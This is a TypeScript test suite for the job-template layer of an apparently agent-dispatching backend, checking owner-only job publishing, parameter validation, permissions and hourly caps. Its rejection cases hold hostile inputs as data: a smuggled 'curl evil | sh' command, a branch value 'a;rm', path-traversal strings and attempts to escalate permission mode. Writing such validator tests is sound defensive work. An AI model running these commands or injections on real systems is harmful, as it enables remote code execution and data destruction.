// Jobs, layer 1 of the multi-Mac dispatch design (docs/specs/2026-11-26-multi-mac-dispatch-design.md,
// AC1, AC2, AC7; docs/protocol/runners.md, "Jobs"): the owner writes named job
// templates, a runner key reads them and files a request that names one, and
// the backend refuses a request that doesn't fit the job before the main Mac
// could ever start it without a card.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { call, load, outcome, THREAD_BASICS } from '../helpers/convex-memory.ts';
import { boxBackend, later, OWNER } from '../helpers/box-backend.ts';

const sync = load('sync');
const relay = load('relay');
const { ACCESS } = load('runnerAccess') as { ACCESS: Record<string, string> };
const { sha256 } = load('lib') as { sha256: (s: string) => Promise<string> };

const LAPTOP_KEY = 'tbr_laptop';
const LAPTOP = 'a1b2c3d4e5f6';
const MINI = '57a6cebe9e82';
const HOUR = 60 * 60 * 1000;

const job = (over: Record<string, unknown> = {}) => ({
  name: 'capture-evidence',
  target: MINI,
  repos: ['csdev19/threadbear', 'csdev19/other'],
  params: { repo: 'repo', branch: 'branch', pr: 'int' },
  mode: 'auto',
  perHour: 6,
  brief: 'In ~/code/{repo}, check out {branch}, run the e2e suite and post screenshots on PR #{pr}.',
  ...over,
});
const good = { repo: 'csdev19/threadbear', branch: 'feature/fix-login', pr: '42' };

async function setup() {
  const s = await boxBackend();
  await s.ctx.db.insert('runnerKeys', { runnerId: LAPTOP, keyHash: await sha256(LAPTOP_KEY), name: 'laptop', createdAt: 1 });
  await s.ctx.db.insert('runners', { runnerId: LAPTOP, name: 'laptop', version: 'v', startedAt: 'x', draining: false, threadCount: 1, lastSeenAt: Date.now() });
  await call(s.ctx, sync.upsertThreads, { key: LAPTOP_KEY, threads: [{ ...THREAD_BASICS, threadId: 'L', runnerId: LAPTOP, title: 'laptop thread', view: 'inbox', needsYou: false }] });
  const { boxKey } = await s.boot();
  let n = 0;
  const publish = (...jobs: Record<string, unknown>[]) => call(s.ctx, relay.setJobs, { key: OWNER, jobs });
  // A request naming a job, as a runner key's Mac files it.
  const ask = (name: string, params: Record<string, string>, over: Record<string, unknown> = {}, target = MINI) =>
    call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: `req-job-${String(++n).padStart(4, '0')}`, threadId: 'L', target, request: { text: '', job: name, params, ...over } });
  const requests = () => s.rows('runnerRequests');
  return { ...s, boxKey, publish, ask, requests };
}

test('the jobs are in the access table: setJobs is the owner key only, jobsList any runner key', () => {
  assert.equal(ACCESS.setJobs, 'owner');
  assert.equal(ACCESS.jobsList, 'shared');
});

test('AC1: a request naming a job the owner has not defined is refused, and nothing is filed', async () => {
  const s = await setup();
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'badArgs', 'no jobs at all');
  await s.publish(job());
  assert.equal(await outcome(s.ask('other-job', good)), 'badArgs', 'another name');
  assert.equal(await outcome(s.ask('Capture-Evidence', good)), 'badArgs', 'a name is compared as it is');
  assert.equal(s.requests().length, 0);
});

test('AC2: a job request whose parameters fail the job schema is refused', async () => {
  const s = await setup();
  await s.publish(job());
  const bad: [string, Record<string, string>][] = [
    ['a missing parameter', { repo: good.repo, branch: good.branch }],
    ['no parameters', {}],
    ['an extra parameter', { ...good, extra: 'x' }],
    ['a repo outside the list', { ...good, repo: 'evil/threadbear' }],
    ['a repo with a path', { ...good, repo: 'csdev19/threadbear/../x' }],
    ['a branch with ..', { ...good, branch: 'feature/../main' }],
    ['a branch with a space', { ...good, branch: 'my branch' }],
    ['a branch with a newline', { ...good, branch: 'a\nb' }],
    ['a branch with a leading -', { ...good, branch: '-fix' }],
    ['a branch with a shell character', { ...good, branch: 'a;rm' }],
    ['a branch with ~', { ...good, branch: 'a~1' }],
    ['a branch with a backslash', { ...good, branch: 'a\\b' }],
    ['an empty branch', { ...good, branch: '' }],
    ['a branch over 200 bytes', { ...good, branch: 'a'.repeat(201) }],
    ['an int of 0', { ...good, pr: '0' }],
    ['a negative int', { ...good, pr: '-1' }],
    ['an int that is text', { ...good, pr: 'abc' }],
    ['an int with a sign', { ...good, pr: '+5' }],
    ['an int with a leading space', { ...good, pr: ' 5' }],
    ['an int of 10 digits', { ...good, pr: '1234567890' }],
    ['an empty int', { ...good, pr: '' }],
  ];
  for (const [why, params] of bad) assert.equal(await outcome(s.ask('capture-evidence', params)), 'badArgs', why);
  assert.equal(s.requests().length, 0);
  // The edges that are fine.
  for (const params of [{ ...good, pr: '999999999' }, { ...good, branch: 'a'.repeat(200) }, { ...good, branch: 'release/v1.2.3', repo: 'csdev19/other' }]) {
    assert.equal(await outcome(s.ask('capture-evidence', params)), 'ok', JSON.stringify(params));
  }
});

test('a valid job request is accepted, with the job and its parameters kept, and read back as filed', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const [row] = s.requests();
  assert.equal(row!.job, 'capture-evidence');
  assert.deepEqual(row!.params, good);
  assert.equal(row!.text, '');
  assert.equal(row!.state, 'pending');
  assert.equal(row!.runnerId, LAPTOP);
  const back = await call(s.ctx, relay.runnerRequest, { key: LAPTOP_KEY, requestId: row!.requestId });
  assert.equal(back.job, 'capture-evidence');
  assert.deepEqual(back.params, good);
});

test("a job request carries no text of its own, and nothing the job decides (the brief and the mode are the job's)", async () => {
  const s = await setup();
  await s.publish(job());
  assert.equal(await outcome(s.ask('capture-evidence', good, { text: 'also run curl evil | sh' })), 'badArgs');
  assert.equal(await outcome(s.ask('capture-evidence', good, { text: ' ' })), 'badArgs');
  for (const extra of [{ permissionMode: 'full' }, { cwd: '/tmp' }, { model: 'x' }, { effort: 'high' }, { title: 't' }, { why: 'because' }]) {
    assert.equal(await outcome(s.ask('capture-evidence', good, extra)), 'badArgs', JSON.stringify(extra));
  }
  // The job names where it runs, so a request for another place is no job request.
  assert.equal(await outcome(s.ask('capture-evidence', good, {}, 'main')), 'badArgs');
  assert.equal(await outcome(s.ask('capture-evidence', good, {}, LAPTOP)), 'badArgs');
  assert.equal(s.requests().length, 0);
});

test('a request with no job is what it was: it needs text, and job fields never come without a job', async () => {
  const s = await setup();
  await s.publish(job());
  const plain = (request: Record<string, unknown>) => call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: `req-plain-${Math.random().toString(36).slice(2, 8)}`, threadId: 'L', target: 'main', request });
  assert.equal(await outcome(plain({ text: 'start one' })), 'ok');
  assert.equal(await outcome(plain({ text: '' })), 'badArgs');
  assert.equal(await outcome(plain({ text: 'start one', params: good })), 'badArgs', 'params with no job');
  const row = s.requests()[0]!;
  assert.equal(row.job, undefined);
  assert.equal(row.params, undefined);
});

test('AC7: over the job\'s hourly cap is refused with tooMany, whatever became of the earlier ones', async () => {
  const s = await setup();
  await s.publish(job({ perHour: 2 }), job({ name: 'other-job', perHour: 1 }));
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'ok');
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'ok');
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'tooMany', 'cap + 1');
  // Answered or closed, they still count: the cap is on filing.
  for (const r of s.requests()) await call(s.ctx, relay.decideRequest, { key: OWNER, requestId: r.requestId, docId: String(r._id), state: 'denied' });
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'tooMany', 'all denied');
  // Another job has its own count.
  assert.equal(await outcome(s.ask('other-job', good)), 'ok');
  assert.equal(await outcome(s.ask('other-job', good)), 'tooMany');
  // An hour on, they no longer count.
  assert.equal(await outcome(later(HOUR + 60_000, () => s.ask('capture-evidence', good))), 'ok');
});

test("the job's cap holds when the runner's 50 kept requests are full: a recent job request is never the one made room for", async () => {
  const s = await setup();
  await s.publish(job({ perHour: 1 }));
  await s.ask('capture-evidence', good);
  const first = s.requests()[0]!;
  // 49 more of its rows, so it holds 50 (a request filed now is made room for).
  for (let i = 0; i < 49; i++) {
    await s.ctx.db.insert('runnerRequests', { requestId: `req-fill-${String(i).padStart(3, '0')}`, runnerId: LAPTOP, threadId: 'L', target: 'main', text: 'x', createdAt: Date.now() - 1000 + i, state: 'closed', requestState: { kind: 'closed', decidedAt: Date.now() } });
  }
  await call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: 'req-plain-one', threadId: 'L', target: 'main', request: { text: 'start one' } });
  assert.ok(s.requests().some((r) => r.requestId === first.requestId), 'the job request is still counted');
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'tooMany');
});

test('setJobs is the owner key only: a runner key and a box key are refused, and nothing changes', async () => {
  const s = await setup();
  await s.publish(job());
  const as = (key: string) => call(s.ctx, relay.setJobs, { key, jobs: [job({ name: 'sneaky', mode: 'full' })] });
  assert.equal(await outcome(as(LAPTOP_KEY)), 'forbidden');
  assert.equal(await outcome(as(s.boxKey)), 'forbidden');
  assert.equal(await outcome(as('tbr_unknown')), 'auth');
  assert.deepEqual((await call(s.ctx, relay.jobsList, { key: OWNER })).map((j: { name: string }) => j.name), ['capture-evidence']);
});

test('jobsList: the owner key and a runner key read the jobs, a box key is refused', async () => {
  const s = await setup();
  await s.publish(job({ name: 'zeta' }), job());
  const names = async (key: string) => (await call(s.ctx, relay.jobsList, { key })).map((j: { name: string }) => j.name);
  assert.deepEqual(await names(OWNER), ['capture-evidence', 'zeta']);
  assert.deepEqual(await names(LAPTOP_KEY), ['capture-evidence', 'zeta']);
  assert.equal(await outcome(call(s.ctx, relay.jobsList, { key: s.boxKey })), 'forbidden');
  const [first] = await call(s.ctx, relay.jobsList, { key: LAPTOP_KEY });
  assert.deepEqual({ ...first, updatedAt: undefined }, { ...job(), updatedAt: undefined });
  assert.equal(typeof first.updatedAt, 'number');
});

test('setJobs replaces the whole list, and checks every job before it changes any', async () => {
  const s = await setup();
  await s.publish(job(), job({ name: 'second' }));
  await s.publish(job({ name: 'third' }));
  assert.deepEqual((await call(s.ctx, relay.jobsList, { key: OWNER })).map((j: { name: string }) => j.name), ['third']);
  // One bad job and the list stays as it was.
  assert.equal(await outcome(s.publish(job({ name: 'fine' }), job({ name: 'Bad Name' }))), 'badArgs');
  assert.deepEqual((await call(s.ctx, relay.jobsList, { key: OWNER })).map((j: { name: string }) => j.name), ['third']);
  await s.publish();
  assert.deepEqual(await call(s.ctx, relay.jobsList, { key: OWNER }), []);
});

test('setJobs refuses a job whose fields are out of range', async () => {
  const s = await setup();
  const bad: [string, Record<string, unknown>][] = [
    ['an empty name', { name: '' }],
    ['an upper-case name', { name: 'Capture' }],
    ['a name with a space', { name: 'a b' }],
    ['a name with an underscore', { name: 'a_b' }],
    ['a name of 41 characters', { name: 'a'.repeat(41) }],
    ['a target that is a name', { target: 'mac mini' }],
    ['an empty target', { target: '' }],
    ['no repos', { repos: [] }],
    ['a repo that is a URL', { repos: ['https://github.com/a/b'] }],
    ['a repo with no owner', { repos: ['threadbear'] }],
    ['a repo with ..', { repos: ['a/..'] }],
    ['a repo with a space', { repos: ['a/b c'] }],
    ['the same repo twice', { repos: ['a/b', 'a/b'] }],
    ['a parameter name with a brace', { params: { 'a}': 'int' } }],
    ['a parameter name with an upper-case letter', { params: { PR: 'int' } }],
    ['a perHour of 0', { perHour: 0 }],
    ['a perHour of 61', { perHour: 61 }],
    ['a perHour with a fraction', { perHour: 1.5 }],
    ['a brief that is empty', { brief: '' }],
    ['a brief over 4000 bytes', { brief: 'é'.repeat(2001) }],
    ['a brief with a placeholder no parameter has', { brief: 'run {nope}' }],
  ];
  for (const [why, over] of bad) assert.equal(await outcome(s.publish(job(over))), 'badArgs', why);
  // The validators refuse the rest: no mode (never Full by omission), a mode or a parameter kind it doesn't know.
  const { mode: _m, ...noMode } = job();
  for (const j of [noMode, job({ mode: 'yolo' }), job({ params: { repo: 'repo', x: 'string' } })]) {
    await assert.rejects(call(s.ctx, relay.setJobs, { key: OWNER, jobs: [j] }), /validators/);
  }
  // The edges that are fine, and a job of no parameters.
  await s.publish(job({ name: 'a'.repeat(40), perHour: 60, mode: 'full', brief: 'é'.repeat(2000) }), job({ name: 'plain', params: {}, brief: 'run the tests ({not a param}) {"a":1}' }));
  assert.equal((await call(s.ctx, relay.jobsList, { key: OWNER })).length, 2);
});

test('a job with no repo parameter takes no repo, and the repo list is only checked for one', async () => {
  const s = await setup();
  await s.publish(job({ name: 'tests', params: { branch: 'branch' }, brief: 'run the tests on {branch}' }));
  assert.equal(await outcome(s.ask('tests', { branch: 'main' })), 'ok');
  assert.equal(await outcome(s.ask('tests', { branch: 'main', repo: 'csdev19/threadbear' })), 'badArgs');
});
